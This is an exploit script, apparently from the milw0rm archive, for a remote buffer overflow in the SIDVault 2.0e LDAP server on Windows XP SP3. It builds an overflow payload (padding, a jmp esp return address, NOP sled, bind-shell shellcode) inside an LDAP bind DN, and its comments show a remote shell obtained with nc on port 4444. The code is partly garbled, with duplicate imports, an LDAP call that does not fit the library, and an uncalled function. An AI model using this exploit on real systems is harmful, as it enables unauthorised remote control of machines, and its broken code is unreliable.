#!/usr/bin/python
#
# $ ./sidvault.py 192.168.1.131
#
# [*] SIDVault 2.0e Windows Remote Buffer Overflow
# [*] Written by blake
# [*] Tested on Windows XP SP3
# [+] Sending payload
# [+] Check port 4444 for shell
#
# $ nc 192.168.1.131 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\WINDOWS\system32>

import socket, sys, ldap3






# windows/shell_bind_tcp - 696 bytes Encoder: x86/alpha_mixed 
# EXITFUNC=seh, LPORT=4444

import ldap3

import socket
from payload import buf

import struct
def shell_attack(target_machine, target_port):
	junk = b"\x41" * 1024		# junk buffer
	ret = b"\x33\xbf\x96\x7c"	# jmp esp 7C96BF33 Shell32.dll XP SP3
	nops = b"\x90" * 10		# nop sled
	sc = buf		# shellcode
	junk2 = b"\x42" * 2375		# 3071 - 696 = 2375 junk


	l = ldap3.Connection.request(target_machine)
	l.simple_bind(b"dc=" + junk + ret + nops + sc + junk2, b"\x42" * 256)



	# milw0rm.com [2009-09-03]